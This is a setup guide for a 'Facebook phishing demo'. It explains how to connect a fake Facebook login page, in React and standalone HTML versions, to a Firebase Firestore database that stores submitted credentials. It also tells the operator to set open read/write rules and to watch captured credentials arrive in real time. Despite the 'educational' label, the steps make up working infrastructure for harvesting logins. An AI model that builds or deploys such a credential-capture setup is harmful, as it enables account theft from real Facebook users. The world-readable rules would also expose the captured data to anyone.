# Firebase Setup Guide

## Required: Configure Firebase for your Facebook phishing demo

### Step 1: Create Firebase Project
1. Go to https://console.firebase.google.com/
2. Click **"Create a project"**
3. Enter project name (e.g., "Facebook Demo")
4. Accept terms and click **"Create project"**

### Step 2: Get Firebase Configuration
1. In your Firebase project dashboard, click the **"</>" icon** (Web app)
2. Register your app with a name (e.g., "facebook-demo")
3. Copy the Firebase configuration object that appears:

```javascript
const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
  projectId: "YOUR_PROJECT_ID",
  storageBucket: "YOUR_PROJECT_ID.appspot.com",
  messagingSenderId: "YOUR_SENDER_ID",
  appId: "YOUR_APP_ID"
};
```

### Step 3: Enable Firestore Database
1. In Firebase console, go to **Firestore Database**
2. Click **"Create database"**
3. Select **"Start in test mode"** (for development)
4. Click **"Next"** and then **"Enable"**

### Step 4: Configure Security Rules (Optional but Recommended)
1. Go to **Firestore Database** → **Rules**
2. Replace default rules with:

```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /accounts/{document=**} {
      allow read, write: if true; // For demo purposes only
    }
  }
}
```

**⚠️ Warning:** These rules allow anyone to read/write. Only use for educational demos!

### Step 5: Update Your Code

#### For React Version:
Update `facebook-phishing/src/firebaseDatabase.js` with your Firebase config:

```javascript
const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
  projectId: "YOUR_PROJECT_ID",
  storageBucket: "YOUR_PROJECT_ID.appspot.com",
  messagingSenderId: "YOUR_SENDER_ID",
  appId: "YOUR_APP_ID"
};
```

#### For Standalone Version:
Update `facebook-phishing/firebase-standalone.html` with your Firebase config in the same location.

### Step 6: Install Firebase Dependencies
```bash
cd facebook-phishing
npm install firebase@^10.12.2
```

### Step 7: Test Your Setup
1. Start your React app: `npm start`
2. Or open `firebase-standalone.html` in browser
3. Enter test credentials and submit
4. Check Firebase console → Firestore Database → accounts collection

### Alternative: Use Environment Variables
For better security, you can store Firebase config in environment variables:

1. Create `.env` file in your project root:
```
REACT_APP_FIREBASE_API_KEY=your_api_key
REACT_APP_FIREBASE_AUTH_DOMAIN=your_project_id.firebaseapp.com
REACT_APP_FIREBASE_PROJECT_ID=your_project_id
REACT_APP_FIREBASE_STORAGE_BUCKET=your_project_id.appspot.com
REACT_APP_FIREBASE_MESSAGING_SENDER_ID=your_sender_id
REACT_APP_FIREBASE_APP_ID=your_app_id
```

2. Update your Firebase config to use environment variables:
```javascript
const firebaseConfig = {
  apiKey: process.env.REACT_APP_FIREBASE_API_KEY,
  authDomain: process.env.REACT_APP_FIREBASE_AUTH_DOMAIN,
  projectId: process.env.REACT_APP_FIREBASE_PROJECT_ID,
  storageBucket: process.env.REACT_APP_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.REACT_APP_FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.REACT_APP_FIREBASE_APP_ID
};
```

## After Setup
Once configured, your Facebook phishing demo will:
- ✅ Store credentials in Firebase Firestore
- ✅ Display real-time database statistics
- ✅ Work with fallback localStorage if Firebase is unavailable
- ✅ Provide educational demonstration of credential capture

## Monitor Your Data
Visit https://console.firebase.google.com/ to see stored credentials in real-time as they're submitted!